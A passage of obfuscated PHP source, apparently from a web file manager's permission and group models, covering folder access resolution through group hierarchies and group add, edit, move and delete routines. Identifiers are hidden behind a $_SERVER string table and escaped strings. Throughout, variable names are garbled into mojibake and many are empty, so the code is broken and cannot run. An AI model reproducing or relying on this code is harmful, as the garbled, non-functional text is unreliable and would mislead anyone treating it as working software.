trim($[$[560]], $[18]))); $[] = $∆£…á + ($[$[43]] == $[85] ? 0 : 1000); } array_multisort($, SORT_ASC, $); return $; } private function groupChidldAllRootSource($Ï£æ) { $ﬂå =& $_SERVER[]; $¬™ = Model($ﬂå[2068])->groupChildrenAll($Ï£æ); $…í = array($ﬂå[190] => 0, $ﬂå[547] => array($ﬂå[17], $¬™), $ﬂå[188] => SourceModel::TYPE_GROUP); $Œ∑ﬂí = Model($ﬂå[865])->field($ﬂå[191])->where($…í)->select(); $Œ∑ﬂí = array_to_keyvalue($Œ∑ﬂí, $ﬂå[22], $ﬂå[191]); return $Œ∑ﬂí; } private function authTargetInfo($Û∫§ö) { $Ÿú =& $_SERVER[]; $ÁßÅ = array(); $ÿÑ = array(); $Óß∫ = 2 << 25; foreach ($Û∫§ö as $”∫) { $ = Model($Ÿú[549])->listData($”∫[$Ÿú[1987]]); if (!$) { continue; } if ($”∫[$Ÿú[188]] == SourceModel::TYPE_USER) { $ = Model($Ÿú[555])->getInfoSimpleOuter($”∫[$Ÿú[547]]); if ($[$Ÿú[1685]] == $Ÿú[1229]) { continue; } if ($[$Ÿú[1685]] == $Ÿú[222]) { $[$Ÿú[42]] = LNG($Ÿú[2069]); } } else { $ = Model($Ÿú[563])->getInfoSimple($”∫[$Ÿú[547]]); } if (!$) { continue; } $[$Ÿú[517]] = $; $ÁßÅ[] = $; $Ò≤èê = 0; if ($”∫[$Ÿú[188]] == SourceModel::TYPE_GROUP) { $Ò≤èê = $Óß∫ * 2; } if ($”∫[$Ÿú[188]] == SourceModel::TYPE_USER) { $Ò≤èê = $Óß∫; } if ($”∫[$Ÿú[188]] == SourceModel::TYPE_USER && $”∫[$Ÿú[547]] == $Ÿú[222]) { $Ò≤èê = 0; } $ÿÑ[] = $[$Ÿú[464]] + $Ò≤èê; } array_multisort($ÿÑ, SORT_DESC, $ÁßÅ); return $ÁßÅ; } public function getAllChildrenByUser($, $œÉ›â) { $Œß⁄Ø =& $_SERVER[]; $—ù = Model($Œß⁄Ø[576])->getInfo($œÉ›â); if (!$œÉ›â || !$ || !$—ù) { return array(); } $ = Model($Œß⁄Ø[1373])->sourceInfo($); $À® = array(); $ﬁ∏ = 1; if ($[$Œß⁄Ø[190]] == $Œß⁄Ø[222] && $[$Œß⁄Ø[547]] != $ﬁ∏ && $this->groupContainUser($[$Œß⁄Ø[547]], $œÉ›â)) { foreach ($—ù[$Œß⁄Ø[2070]] as $ÃÖ) { $À∫ = Model($Œß⁄Ø[563])->getInfo($ÃÖ[$Œß⁄Ø[1883]]); $÷ú = Model($Œß⁄Ø[576])->getInfoSimpleOuter($œÉ›â); $÷ú[$Œß⁄Ø[517]] = $ÃÖ[$Œß⁄Ø[464]]; if (Model($Œß⁄Ø[549])->authCheckAction($ÃÖ[$Œß⁄Ø[464]][$Œß⁄Ø[464]], $Œß⁄Ø[1904])) { continue; } $ = array($Œß⁄Ø[42] => $Œß⁄Ø[1249] . $À∫[$Œß⁄Ø[42]], $Œß⁄Ø[191] => $À∫[$Œß⁄Ø[97]][$Œß⁄Ø[191]], $Œß⁄Ø[94] => KodIO::make($À∫[$Œß⁄Ø[97]][$Œß⁄Ø[191]]), $Œß⁄Ø[190] => $Œß⁄Ø[222], $Œß⁄Ø[188] => $Œß⁄Ø[556], $Œß⁄Ø[43] => $Œß⁄Ø[593], $Œß⁄Ø[560] => $À∫[$Œß⁄Ø[567]], $Œß⁄Ø[1883] => $À∫[$Œß⁄Ø[1883]], $Œß⁄Ø[564] => $À∫[$Œß⁄Ø[190]], $Œß⁄Ø[2067] => array($÷ú)); $À®[$[$Œß⁄Ø[191]]] = $; } } $Î¥Ö = array(); $ﬂ©…° = $this->getAllChildren($); foreach ($ﬂ©…° as $) { $ æ = !1; foreach ($[$Œß⁄Ø[2067]] as $ﬁßÌë¥) { if ($ﬁßÌë¥[$Œß⁄Ø[1685]]) { if ($ﬁßÌë¥[$Œß⁄Ø[1685]] == $œÉ›â) { $ æ = !0; break; } } if ($ﬁßÌë¥[$Œß⁄Ø[1883]]) { if ($this->groupContainUser($ﬁßÌë¥[$Œß⁄Ø[1883]], $œÉ›â)) { $ æ = !0; break; } } } if ($ æ) { $Î¥Ö[] = $; } $‹Å = $[$Œß⁄Ø[191]]; if (isset($À®[$‹Å])) { $[$Œß⁄Ø[2067]][] = $À®[$‹Å][0]; $À®[$‹Å] = !1; } } $À® = array_filter(array_values($À®)); $Î¥Ö = array_merge($À®, $Î¥Ö); return $Î¥Ö; } public function setAllChildrenByUser($, $Œé, $«à) { $ =& $_SERVER[]; $Âêº»¨ = $this->getAllChildrenByUser($, $Œé); if (!$«à || !$Âêº»¨) { return !1; } foreach ($Âêº»¨ as $«ª) { $ = array(); foreach ($«ª[$[2067]] as $Ÿ∫) { $”é = $Ÿ∫[$[517]]; $ = $Ÿ∫[$[1685]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $–∑ = $Ÿ∫[$[1685]] ? $Ÿ∫[$[1685]] : $Ÿ∫[$[1883]]; if ($Ÿ∫[$[1685]] && $Ÿ∫[$[1685]] == $Œé) { continue; } $[] = array($[191] => $«ª[$[191]], $[188] => $, $[547] => intval($–∑), $[1987] => isset($”é[$[452]]) ? intval($”é[$[452]]) : 0, $[2047] => isset($”é[$[2047]]) ? intval($”é[$[2047]]) : -1); } $[] = array($[191] => $«ª[$[191]], $[188] => SourceModel::TYPE_USER, $[547] => intval($Œé), $[1987] => intval($«à), $[2047] => -1); $this->where(array($[468] => $«ª[$[191]]))->delete(); $this->addAll($); } return !0; } public function get($·†™) { $ = $this->getSourceList(array($·†™), !0); return $[0]; } public function getSourceList($, $“ã = false, $ = false) { $‘≥ =& $_SERVER[]; if (!$) { return array(); } $√Ω = Model($‘≥[1373]); if (!$“ã && count($) == 1) { $“ã = array(); $“ã[$[0]] = $√Ω->sourceInfo($[0]); } if (!$“ã) { $ﬂ© = array($‘≥[468] => array($‘≥[469], $)); $“ã = $√Ω->field($‘≥[2071])->where($ﬂ©)->select(); $“ã = array_to_keyvalue($“ã, $‘≥[191]); } $‹≤ = $; foreach ($“ã as $“û => $»µ) { $œã = $√Ω->parentLevelArray($»µ[$‘≥[562]]); $‹≤ = array_merge($‹≤, array($“û), array_reverse($œã)); } $‹≤ = array_values(array_unique($‹≤)); if (!$‹≤) { return array(); } $œè = $this->sourceAuthSelect($‹≤); $“É = array(); foreach ($‹≤ as $) { if (isset($œè[$])) { $“É[$] = $œè[$]; } } $ = $this->userIsRoot($); $–å = AuthModel::authAll(); $ = array($‘≥[465] => $–å, $‘≥[2072] => array($‘≥[470] => 0, $‘≥[1889] => $–å, $‘≥[471] => LNG($‘≥[2073]), $‘≥[1906] => $‘≥[2074])); $ = array(); foreach ($“ã as $ => $Ÿ†) { if ($ && $GLOBALS[$‘≥[16]][$‘≥[1902]]) { $[$] = $; continue; } $[$] = $this->makeSourceAuth($Ÿ†, $“É, $); } return $; } public function authDeepCheck($Â∫õ, $Îüá = false) { $Ÿ© =& $_SERVER[]; $Îüá = $Îüá ? $Îüá : USER_ID; $ = $this->makeAuthDeep($Îüá); if (!in_array($Â∫õ, $[$Ÿ©[2075]])) { return !1; } $∆∏«Å = array(); foreach ($[$Ÿ©[2076]] as $ﬂö => $Ÿè) { if (!in_array($Â∫õ, $Ÿè)) { continue; } $∆∏«Å[] = $ﬂö; } if (!$∆∏«Å) { return !1; } $›ß = $∆∏«Å ? $∆∏«Å[0] : $Â∫õ; return array($Ÿ©[465] => -1, $Ÿ©[517] => array($Ÿ©[470] => $Ÿ©[1229], $Ÿ©[1889] => $Ÿ©[222], $Ÿ©[471] => LNG($Ÿ©[2077]), $Ÿ©[1906] => $Ÿ©[2078]), $Ÿ©[2079] => LNG($Ÿ©[2080]), $Ÿ©[2081] => $this->sourceAuthInfo($›ß)); } protected function makeAuthDeep($ = false) { $ =& $_SERVER[]; static $ = array(); $ = $ ? $ : USER_ID; if (isset($[$])) { return $[$]; } $›£ = Model($[2082])->listData(); $ÎΩé = array(); foreach ($›£ as $ í) { if ($ í[$[464]] == 0 && $ í[$[1905]] == $[98]) { $ÎΩé[] = $ í[$[452]]; } } $ = $this->userGroupParents($); $ÃÉ = array($[188] => SourceModel::TYPE_USER, $[547] => $); if ($) { $ÃÉ = array(array($[188] => SourceModel::TYPE_USER, $[547] => $), array($[188] => SourceModel::TYPE_GROUP, $[547] => array($[469], $)), $[1041] => $[1981]); } $‹© = $this->field($[2083])->where($ÃÉ)->select(); $«¶ = array(); $Ã¨Áâó = array_to_keyvalue_group($‹©, $[191]); foreach ($Ã¨Áâó as $œ®›≤ => $) { $‹í›¶ = $this->authArrayCheck($, $); if ($‹í›¶[$[465]] > 0) { $«¶[] = $œ®›≤ . $[22]; } } if ($) { $‰èê = Model($[563]); foreach ($ as $) { $√õ = $‰èê->getInfo($); if (!$√õ || !is_array($√õ[$[97]])) { continue; } $«¶[] = $√õ[$[97]][$[191]]; } } $’∫◊Ø = array(); $Ëëµ = $; $ﬁê›∫ = Model($[1373]); $‰èê = Model($[563]); $…ì = array(); $ = array(); $’ì = array(); $‚®ñ = array(); if ($«¶) { $‘£ = $ﬁê›∫->where(array($[191] => array($[469], $«¶)))->select(); foreach ($‘£ as $) { $Úùàé = $ﬁê›∫->parentLevelArray($[$[562]]); $’∫◊Ø = array_merge($’∫◊Ø, $Úùàé); $Ëëµ[] = $[$[547]]; $…ì[$[$[191]]] = $Úùàé; $[$[$[191]]] = $[$[547]]; } } $Ëëµ = array_values(array_unique($Ëëµ)); $⁄ä = $Ëëµ; foreach ($⁄ä as $) { $√õ = $‰èê->getInfo($); $Úùàé = $ﬁê›∫->parentLevelArray($√õ[$[562]]); $Ëëµ = array_merge($Ëëµ, $Úùàé); } $Ëëµ = array_values(array_unique($Ëëµ)); foreach ($Ëëµ as $) { $√õ = $‰èê->getInfo($); $’∫◊Ø[] = $√õ[$[97]][$[191]]; $’ì[$] = $√õ[$[97]][$[191]]; $‚®ñ[$] = $ﬁê›∫->parentLevelArray($√õ[$[562]]); } foreach ($…ì as $“õ => $«™) { $‘õ = $[$“õ]; if (!$‘õ || !$’ì[$‘õ]) { continue; } $ = array(); foreach ($‚®ñ[$‘õ] as $) { $[] = $’ì[$]; } $…ì[$“õ] = array_merge($, $«™); } $’∫◊Ø = array_values(array_unique($’∫◊Ø)); $ = array($[2075] => $’∫◊Ø, $[2076] => $…ì); $[$] = $; return $; } private function makeSourceAuth($Â´©, $¬´, $‹≤ = false) { $ =& $_SERVER[]; $€â = $[98]; $ = $Â´©[$[547]]; $ = $Â´©[$[188]] == SourceModel::TYPE_GROUP; $ŸΩ = $ ? $this->groupRootAuth($, $‹≤) : !1; if ($ŸΩ && Model($[549])->authCheckAction($ŸΩ[$[464]], $[1904])) { return $this->groupAuthInfo($ŸΩ, $); } $ = Model($[1373])->parentLevelArray($Â´©[$[562]]); $ = array_merge(array($Â´©[$[191]]), array_reverse($)); $ = !1; foreach ($ as $ Æ¬∑) { if (!isset($¬´[$ Æ¬∑])) { continue; } $’® = $this->authMake($¬´[$ Æ¬∑], $‹≤); if ($’®[$[517]]) { $ = $’®; break; } } if (!$) { return $; } if (!$ && $ŸΩ) { $ = $this->groupAuthInfo($ŸΩ, $); } if (!$) { $ = Model($[563])->getInfo($); $ = explode($[60], trim($[$[562]], $[60])); $ = array_reverse($); foreach ($ as $„äá) { if ($„äá == $[222] || $„äá == $€â) { continue; } $“ë = $this->groupRootAuth($„äá, $‹≤); if (!$“ë) { continue; } $ = $this->groupAuthInfo($“ë, $„äá); break; } } if (!$ || $[$[465]] <= 0) { $–â = $this->authDeepCheck($Â´©[$[191]], $‹≤); if ($–â) { $ = $–â; } } return $; } private function userIsRoot($‚úê = false) { $ =& $_SERVER[]; if (!$‚úê && _get($GLOBALS, $[545])) { return !0; } $ = Model($[576])->getInfo($‚úê); $’§ = Model($[2084])->listData($[$[1561]]); if ($’§ && $’§[$[553]][$[2085]] == 1) { return !0; } return !1; } private function sourceAuthInfo($) { $◊Ä =& $_SERVER[]; $—ò = Model($◊Ä[1373]); $ﬂ≠“® = $—ò->sourceInfo($); if (!$ﬂ≠“®) { return !1; } $—ò->groupPathDisplay($ﬂ≠“®); $ = array($ﬂ≠“®); $ = $—ò->_listAppendPath($); $ﬂ≠“® = $[0]; $È¶° = $ﬂ≠“®[$◊Ä[560]]; if (isset($ﬂ≠“®[$◊Ä[568]])) { $≈Ä“Ñ = explode($◊Ä[18], trim($ﬂ≠“®[$◊Ä[560]], $◊Ä[18])); array_shift($≈Ä“Ñ); $È¶° = $ﬂ≠“®[$◊Ä[566]] . $◊Ä[2086] . implode($◊Ä[18], $≈Ä“Ñ); } return array($◊Ä[471] => $ﬂ≠“®[$◊Ä[42]], $◊Ä[94] => KodIO::make($ﬂ≠“®[$◊Ä[191]]), $◊Ä[2087] => $È¶°); } private function groupAuthInfo($, $) { $›¥ =& $_SERVER[]; $÷ö = Model($›¥[563])->getInfo($); return array($›¥[2088] => intval($[$›¥[464]]), $›¥[2072] => $, $›¥[2089] => LNG($›¥[2090]), $›¥[2081] => array($›¥[471] => $÷ö[$›¥[42]], $›¥[94] => KodIO::make($÷ö[$›¥[97]][$›¥[191]]), $›¥[2087] => $÷ö[$›¥[567]])); } protected function groupRootAuth($, $…è¬û = false) { $“Ç =& $_SERVER[]; $…è¬û = $…è¬û ? $…è¬û : USER_ID; $”ª = $…è¬û . $“Ç[2091] . $; static $ = array(); if (isset($[$”ª])) { return $[$”ª]; } $ = Model($“Ç[563])->getInfo($); $«π = $this->userGroupList($…è¬û); $Õü = isset($«π[$]) ? $«π[$][$“Ç[464]] : !1; if ($Õü && Model($“Ç[549])->authCheckAction($Õü[$“Ç[464]], $“Ç[1904])) { $[$”ª] = $Õü; return $Õü; } $ÿù = $this->sourceAuthSelect($[$“Ç[97]][$“Ç[191]]); $ = $ÿù ? $this->authMake($ÿù, $…è¬û) : !1; $Õ© = $ ? $[$“Ç[517]] : !1; $[$”ª] = $Õ© ? $Õ© : $Õü; return $[$”ª]; } public function authOwnerApply($≈Ç) { $ =& $_SERVER[]; if (empty($≈Ç[$[464]]) || isset($≈Ç[$[2092]]) && $≈Ç[$[2092]]) { return $≈Ç; } if (AuthModel::authCheckRoot($≈Ç[$[464]][$[465]])) { return $≈Ç; } $…∂ = Model($[1373])->parentLevelArray($≈Ç[$[562]]); $…∂ = array_merge(array($≈Ç[$[191]]), array_reverse($…∂)); $‚¥π = $this->sourceAuthSelect($…∂); $«ï = array(); $ﬂ∞ = array(); foreach ($‚¥π as $ => $) { $⁄ÉÀú = $this->authFolderOwnerUser($); $«ï[$] = $⁄ÉÀú; $ﬂ∞ = array_merge($ﬂ∞, $⁄ÉÀú[$[639]]); if ($⁄ÉÀú[$[2093]]) { break; } } if (count($ﬂ∞) == 0) { $ﬂ∞ = $this->authFolderOwnerGroup($≈Ç[$[547]]); } $ﬂ∞ = array_unique($ﬂ∞); if (AuthModel::authCheckRoot($≈Ç[$[464]][$[465]])) { $ﬂ∞[] = USER_ID; } $≈Ç[$[464]][$[2094]] = Model($[555])->userListInfo($ﬂ∞); return $≈Ç; } private function authFolderOwnerGroup($√¥) { $◊ä =& $_SERVER[]; $‹ß = Model($◊ä[1973])->where(array($◊ä[1883] => $√¥))->select(); $ = array(); if (!$‹ß) { return $; } foreach ($‹ß as $) { $ = $this->authInfo($); if (AuthModel::authCheckRoot($[$◊ä[464]])) { $[] = $[$◊ä[1685]]; } } return $; } private function authFolderOwnerUser($Èøô) { $‹π‹ú =& $_SERVER[]; $“£ = array(); $ÿß–ó = !1; foreach ($Èøô as $¬¢) { $·πÜ = $this->authInfo($¬¢); if ($¬¢[$‹π‹ú[547]] == $‹π‹ú[222]) { $ÿß–ó = !0; } if ($¬¢[$‹π‹ú[188]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($·πÜ[$‹π‹ú[464]])) { $“£[] = $¬¢[$‹π‹ú[547]]; } } } return array($‹π‹ú[639] => $“£, $‹π‹ú[2093] => $ÿß–ó); } public function authMake($ﬁ®ÿÖ, $ = false) { $ =& $_SERVER[]; $ = $this->authArrayCheck($ﬁ®ÿÖ, $); if ($[$[2095]]) { $[$[2095]] = $this->sourceAuthInfo($[$[2095]]); } return $; } public function authArrayCheck($, $ = false) { $Ã∑ =& $_SERVER[]; if (!$) { return array($Ã∑[465] => 0, $Ã∑[517] => !1); } $ = $ ? $ : USER_ID; $ = 0; $ = 0; $÷ç«ù = 0; $ = 0; $»´Â≠ü = 0; $ = 0; $ = 1000; $ = 0; $Á∏å = 0; $“ã = 0; $ﬁåÈ§ê = 0; $Àû = array($Ã∑[191] => 0); foreach ($ as $Àû) { $ = $this->authInfo($Àû); if (!$) { continue; } $ÿÑ = $Àû[$Ã∑[547]]; $ = intval($[$Ã∑[464]]); if ($Àû[$Ã∑[188]] == SourceModel::TYPE_USER && $ÿÑ == $) { $ = !0; $÷ç«ù = $; $ = $; } else { if ($Àû[$Ã∑[188]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ÿÑ, $)) { $ = !0; $ = $this->groupStepToUserGroup($ÿÑ, $); if ($ < $) { $ = $; $»´Â≠ü = $; $ = $; $ = $ÿÑ; } if ($ == $ && $ >= $»´Â≠ü) { $»´Â≠ü = $; $ = $; $ = $ÿÑ; } } else { if ($ÿÑ == $Ã∑[222]) { $Á∏å = !0; $ﬁåÈ§ê = $; $“ã = $; } } } } if ($) { $ ë = $; $ = $÷ç«ù; $ƒõ…£ = LNG($Ã∑[2096]); } else { if ($) { $ ë = $»´Â≠ü; $ = $; $¬à = Model($Ã∑[563])->getInfo($); $ƒõ…£ = $Ã∑[173] . $¬à[$Ã∑[567]] . $Ã∑[2097] . LNG($Ã∑[2098]); } else { if ($Á∏å) { $ ë = $“ã; $ = $ﬁåÈ§ê; $ƒõ…£ = LNG($Ã∑[2069]); } else { $ ë = 0; $ = !1; $ƒõ…£ = $Ã∑[22]; } } } $ = array($Ã∑[2088] => intval($ ë), $Ã∑[2072] => $, $Ã∑[2089] => $ƒõ…£, $Ã∑[2081] => $Àû[$Ã∑[191]]); return $; } private function groupContainUser($Ÿ∫, $‹± = false) { return in_array($Ÿ∫, $this->userGroupParents($‹±)); } private function groupStepToUserGroup($, $ = false) { $ =& $_SERVER[]; $…Ü = $this->userGroupList($); $ÕπÈûÇ = 1000; $‚î• = $GLOBALS[$[16]][$[99]][$[1986]] == 1; $Ëî≠ = $‚î• ? 3 : 2; foreach ($…Ü as $ÃèﬂÜ) { if ($ÃèﬂÜ[$[1883]] == $) { return 0; } $ = explode($[60], trim($ÃèﬂÜ[$[562]], $[60])); if ($[0] == $[222] && count($) > $Ëî≠) { $œ¶ = array_reverse(array_slice($, $Ëî≠)); $⁄é„§π = array_search($, $œ¶); if ($⁄é„§π !== !1 && $⁄é„§π + 1 <= $ÕπÈûÇ) { $ÕπÈûÇ = $⁄é„§π + 1; } } } return $ÕπÈûÇ; } private function userGroupList($È´ô = false) { $ÃÖÀæ =& $_SERVER[]; static $ = array(); if (isset($[$È´ô])) { return $[$È´ô]; } $Ó∑Ö = Model($ÃÖÀæ[576])->getInfo($È´ô); $[$È´ô] = array_to_keyvalue($Ó∑Ö[$ÃÖÀæ[2070]], $ÃÖÀæ[1883]); return $[$È´ô]; } public function userGroupParents($–Ç) { $ =& $_SERVER[]; static $ = array(); $–Ç = $–Ç ? $–Ç : USER_ID; if (isset($[$–Ç])) { return $[$–Ç]; } $ = $this->userGroupList($–Ç); $ = array(); $ = $GLOBALS[$[16]][$[99]][$[1986]] == 1; $Œô = $ ? 3 : 2; foreach ($ as $„óÉ) { $ = array($„óÉ[$[1883]]); $ = explode($[60], trim($„óÉ[$[562]], $[60])); if ($[0] == $[222] && count($) > $Œô) { $ = array_slice($, $Œô); $ = array_merge($, array_reverse($)); } $ = array_merge($, $); } $[$–Ç] = array_unique($); return $[$–Ç]; } public function authTargetInfoMake($ƒ∫) { $ =& $_SERVER[]; $∆≥ = array(); $Ÿ±ƒ• = array(); foreach ($ƒ∫ as $Îß™) { if ($Îß™[$[188]] == SourceModel::TYPE_USER) { $∆≥[] = intval($Îß™[$[547]]); } else { if ($Îß™[$[188]] == SourceModel::TYPE_GROUP) { $Ÿ±ƒ•[] = intval($Îß™[$[547]]); } } } if ($∆≥) { $∆≥ = Model($[555])->userListInfo($∆≥); } if ($Ÿ±ƒ•) { $‘´ = array($[1971] => array($[469], $Ÿ±ƒ•)); $Ÿ±ƒ• = Model($[563])->field($[2099])->where($‘´)->select(); $Ÿ±ƒ• = array_to_keyvalue($Ÿ±ƒ•, $[1883]); } return array($[2100] => $∆≥, $[2101] => $Ÿ±ƒ•); } public function authInfo($) { $‘ñ =& $_SERVER[]; if ($[$‘ñ[1987]]) { $ÓÖ∞œ∫ = Model($‘ñ[549])->listData($[$‘ñ[1987]]); if (!$ÓÖ∞œ∫) { return !1; $€ÑŸ¶ = Model($‘ñ[549])->listData(); $≈ª = array_filter_by_field($€ÑŸ¶, $‘ñ[464], $‘ñ[222]); return $≈ª; } $Ë†∏ = array_field_key($ÓÖ∞œ∫, array($‘ñ[452], $‘ñ[42], $‘ñ[464], $‘ñ[1906], $‘ñ[1907])); $Ë†∏[$‘ñ[2102]] = $; return $Ë†∏; } else { return array($‘ñ[470] => 0, $‘ñ[1889] => $[$‘ñ[2047]], $‘ñ[471] => $‘ñ[22], $‘ñ[1906] => $‘ñ[2103]); } } } goto a; F: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\x75\x70"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\145" => "\147\x72\x6f\165\x70\137\x6d\x65\x74\x61", "\x6d\145\164\141\x46\151\x65\154\x64" => "\x67\x72\x6f\165\160\111\104"); protected function cacheFunctionAlias($ÿù) { $›≤ =& $_SERVER[]; return array($›≤[1961] => array($ÿù[0], $›≤[1962]), $›≤[1963] => array($ÿù[0], $›≤[1964])); } protected function getInfo($Â¥ñ, $ = false) { $∆Ü = $this->getInfoSimple($Â¥ñ); if (!$∆Ü) { return !1; } if ($) { return $this->_listDataApplyItem($∆Ü); } return $this->cacheFunctionGet($_SERVER[][1965], $Â¥ñ); } protected function getInfoSimple($, $’ø = false) { $…Æ =& $_SERVER[]; if ($’ø) { $ÏÖá = array($…Æ[1883] => intval($)); $Ÿ≤ = $this->where($ÏÖá)->find(); return is_array($Ÿ≤) ? $Ÿ≤ : array(); } return $this->cacheFunctionGet($…Æ[1966], $); } protected function groupAdd($÷ë) { $◊í =& $_SERVER[]; if (!$÷ë[$◊í[190]] && isset($÷ë[$◊í[1883]]) && $÷ë[$◊í[1883]] == 1) { if ($€¶ÿß = $this->getInfoSimple($÷ë[$◊í[1883]], !0)) { return $÷ë[$◊í[1883]]; } } else { $€¶ÿß = $this->getInfoSimple($÷ë[$◊í[190]]); if (!$€¶ÿß) { return !1; } } $≈ø = $◊í[572]; if ($€¶ÿß[$◊í[562]]) { $≈ø = $€¶ÿß[$◊í[562]] . $€¶ÿß[$◊í[1883]] . $◊í[60]; } $ á∆î = array($◊í[471] => $this->groupNameAuto($÷ë[$◊í[190]], $÷ë[$◊í[42]]), $◊í[454] => $÷ë[$◊í[190]], $◊í[629] => $≈ø, $◊í[1967] => $÷ë[$◊í[1870]], $◊í[1968] => 0, $◊í[1887] => 0); if (isset($÷ë[$◊í[1907]])) { $ á∆î[$◊í[1907]] = $÷ë[$◊í[1907]]; } else { $Ïêö = $this->max($◊í[1907]); if (!$Ïêö) { $Ïêö = 0; } $ á∆î[$◊í[1907]] = $Ïêö + 1; } if (!empty($÷ë[$◊í[1883]])) { $ á∆î[$◊í[1883]] = $÷ë[$◊í[1883]]; } $ÿÑ = $this->add($ á∆î); $this->setNamePinyin($ÿÑ, $ á∆î[$◊í[42]]); if (isset($÷ë[$◊í[1969]])) { $this->metaSet($ÿÑ, array($◊í[1969] => $÷ë[$◊í[1969]], $◊í[1970] => $÷ë[$◊í[1970]])); unset($÷ë[$◊í[1969]]); unset($÷ë[$◊í[1970]]); } Model($◊í[1373])->groupRootAdd($ÿÑ); $this->_clearCache($÷ë[$◊í[190]]); return $ÿÑ; } protected function groupEdit($ﬁÆ, $’Ü) { $ =& $_SERVER[]; $‰èú = $this->getInfoSimple($ﬁÆ); if (!$‰èú) { return !1; } if (!empty($’Ü[$[190]])) { $’¢ = $this->getInfoSimple($’Ü[$[190]]); if (!$’¢) { return !1; } if ($‰èú[$[1883]] == $’¢[$[1883]]) { return !1; } if ($’Ü[$[190]] != $‰èú[$[190]]) { if ($’¢[$[562]] !== $‰èú[$[562]] && strpos($’¢[$[562]], $‰èú[$[562]] . $‰èú[$[1883]] . $[60]) === 0) { return !1; } $’Ü[$[629]] = $’¢[$[562]] . $’Ü[$[190]] . $[60]; $this->_changeChildLevel($‰èú, $’¢); $this->_clearCache($’¢[$[1883]]); $this->_clearCache($‰èú[$[190]]); } } if (isset($’Ü[$[42]])) { $this->setNamePinyin($ﬁÆ, $’Ü[$[42]]); } if (isset($’Ü[$[1969]])) { $this->metaSet($ﬁÆ, array($[1969] => $’Ü[$[1969]], $[1970] => $’Ü[$[1970]])); unset($’Ü[$[1969]]); unset($’Ü[$[1970]]); } $this->_clearChildrenCache($‰èú); return $this->where(array($[1971] => $ﬁÆ))->save($’Ü); } private function _clearChildrenCache($÷∑) { $÷¨ =& $_SERVER[]; $‹ü = array($÷¨[629] => array($÷¨[589], $÷∑[$÷¨[562]] . $÷∑[$÷¨[1883]] . $÷¨[590])); $ = $this->field($÷¨[1883])->where($‹ü)->select(); foreach ($ as $) { $this->_clearCache($[$÷¨[1883]]); } } private function _clearCache($Â≤©) { $ =& $_SERVER[]; $this->cacheFunctionClear($[1965], $Â≤©); $this->cacheFunctionClear($[1966], $Â≤©); } private function _changeChildLevel($, $, $Ï™≥ = false) { $ =& $_SERVER[]; $“ú = $[$[562]] . $[$[1883]] . $[60]; $ = $[$[562]] . $[$[1883]] . $[60] . $[$[1883]] . $[60]; if ($Ï™≥) { $ = $[$[562]] . $[$[1883]] . $[60]; } $Õ¢ = array($[629] => array($[589], $[$[562]] . $[$[1883]] . $[590])); $ = array($[629] => array($[638], "\x72\145\x70\x6c\x61\x63\145\x28\x70\x61\x72\x65\156\x74\x4c\x65\166\145\154\x2c\x27{$“ú}\47\54\x27{$}\47\x29")); $this->_clearChildrenCache($); $this->where($Õ¢)->data($)->save(); } public function setNamePinyin($, $‘• = false) { $ =& $_SERVER[]; if (!$‘•) { $Ûòâè = $this->getInfoSimple($); $‘• = $Ûòâè[$[42]]; } if (!Input::check($‘•, $[632])) { $this->metaSet($, $[515], null); $this->metaSet($, $[514], null); return; } $⁄ÑÀæ = array($[515] => str_replace($[63], $[22], Pinyin::get($‘•)), $[514] => Pinyin::get($‘•, $[633])); $this->metaSet($, $⁄ÑÀæ); } protected function groupStatus($, $÷Ü) { $ =& $_SERVER[]; $◊ô = $this->getInfoSimple($); if (!$◊ô) { return !1; } if ($÷Ü == $[98]) { $“Ñ = $this->parentLevelArray($◊ô[$[562]]); } else { $Àø = array($[629] => array($[589], $◊ô[$[562]] . $◊ô[$[1883]] . $[590])); $“Ñ = $this->where($Àø)->field($[1883])->select(); $“Ñ = array_to_keyvalue($“Ñ, $[22], $[1883]); } $“Ñ[] = $◊ô[$[1883]]; $ = array(); foreach ($“Ñ as $) { $[] = array($[1883] => $, $[104] => $[790], $[427] => $÷Ü); $this->_clearCache($); } return Model($[1972])->addAll($, array(), !0); } protected function groupRemove($, $ = false) { $÷ß =& $_SERVER[]; $ = array($÷ß[1883] => $); $œ∂«´ = $this->where($)->find(); if (!$œ∂«´ || $œ∂«´[$÷ß[190]] == 0) { return !1; } if (!$) { $ƒ¢ = $this->getInfoSimple($œ∂«´[$÷ß[190]]); $this->_changeChildLevel($œ∂«´, $ƒ¢, !0); $this->where(array($÷ß[190] => $))->save(array($÷ß[190] => $œ∂«´[$÷ß[190]])); $this->_clearCache($ƒ¢[$÷ß[1883]]); } Model($÷ß[1972])->where($)->delete(); Model($÷ß[1973])->where($)->delete(); Model($÷ß[865])->groupRootRemove($); $this->_clearCache($œ∂«´[$÷ß[190]]); return $this->where($)->delete(); } protected function groupSort($) { $ =& $_SERVER[]; $ = array(); foreach ($ as $ﬂß => $ ´) { $[] = array($[1883], $ ´, $[1907], $ﬂß + 1); } $this->saveAll($); } public function listData() { $Ôí± = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ôí±[$_SERVER[][422]]); return $Ôí±; } private function _makeOrder($ = '') { $Œî”ñ =& $_SERVER[]; $ = array($Œî”ñ[1883], $Œî”ñ[42], $Œî”ñ[1872], $Œî”ñ[225]); $Ãì = array($Œî”ñ[500] => $Œî”ñ[501], $Œî”ñ[502] => $Œî”ñ[503]); $ ¨ = Input::get($Œî”ñ[507], $Œî”ñ[17], $Œî”ñ[1887], $); $ = Input::get($Œî”ñ[508], $Œî”ñ[17], $Œî”ñ[1974], array($Œî”ñ[1974], $Œî”ñ[502])); $ = $Ãì[$]; $ = $ . "{$ ¨}\x20{$}\54\x20\147\162\157\x75\160\x49\104\x20\x61\163\x63"; return $this->order($); } public function listChild($Ã∏◊¶) { $ =& $_SERVER[]; $«ø = $this->where(array($[190] => $Ã∏◊¶))->_makeOrder()->selectPage(200); $this->_listDataApply($«ø[$[422]]); return $«ø; } public function listChildIds($—ú⁄Ö) { $‰≥¥ =& $_SERVER[]; if (is_string($)) { $—ú⁄Ö = explode($‰≥¥[60], $—ú⁄Ö); } $·ç´ = $this->where(array($‰≥¥[1883] => array($‰≥¥[17], $—ú⁄Ö)))->field($‰≥¥[1975])->select(); if (!$·ç´) { return !1; } $∆ß = array(); foreach ($·ç´ 